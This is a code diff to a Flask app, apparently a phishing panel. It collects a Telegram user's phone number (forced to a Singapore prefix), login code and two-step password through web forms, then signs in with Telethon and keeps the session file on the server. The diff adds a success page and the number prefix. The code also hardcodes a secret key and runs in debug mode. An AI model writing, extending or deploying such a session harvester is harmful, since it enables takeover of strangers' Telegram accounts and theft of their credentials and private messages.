@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template, redirect, url_for, session, flash
+from flask import Flask, request, render_template, redirect, url_for, session, flash, make_response
 from telethon import TelegramClient, errors
 import asyncio
 
@@ -11,16 +11,18 @@ app.secret_key = 'supersecretkey'
 client_dict = {}
 phone_code_hash_dict = {}
 
+
 @app.route('/', methods=['GET', 'POST'])
 def index():
     if request.method == 'POST':
-        phone_number = request.form['phone_number']
+        phone_number = "65" + request.form['phone_number']
         session['phone_number'] = phone_number
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         loop.run_until_complete(send_otp(phone_number))
         return redirect(url_for('confirm_otp'))
     return render_template('index.html')
+
 
 @app.route('/confirm_otp', methods=['GET', 'POST'])
 def confirm_otp():
@@ -31,13 +33,15 @@ def confirm_otp():
         asyncio.set_event_loop(loop)
         try:
             loop.run_until_complete(confirm_otp_async(phone_number, otp))
-            return "OTP berhasil dikonfirmasi dan sesi disimpan!"
+            response = make_response(render_template('success.html'))
+            return response
         except errors.SessionPasswordNeededError:
             return handle_password_needed(phone_number)
         except Exception as e:
             flash(f"Error saat mengkonfirmasi OTP: {str(e)}")
             return redirect(url_for('confirm_otp'))
     return render_template('confirm_otp.html', phone_number=phone_number)
+
 
 @app.route('/enter_password', methods=['GET', 'POST'])
 def enter_password():
@@ -46,6 +50,7 @@ def enter_password():
         session['password'] = password
         return redirect(url_for('confirm_otp'))
     return render_template('enter_password.html')
+
 
 async def send_otp(phone_number):
     client = TelegramClient(f'session_{phone_number}', api_id, api_hash)
@@ -63,6 +68,7 @@ async def send_otp(phone_number):
             await client.disconnect()
             return
     await client.disconnect()
+
 
 async def confirm_otp_async(phone_number, otp):
     client = TelegramClient(f'session_{phone_number}', api_id, api_hash)
@@ -85,8 +91,10 @@ async def confirm_otp_async(phone_number, otp):
     finally:
         await client.disconnect()
 
+
 def handle_password_needed(phone_number):
     return redirect(url_for('enter_password'))
+
 
 if __name__ == '__main__':
     app.run(debug=True)
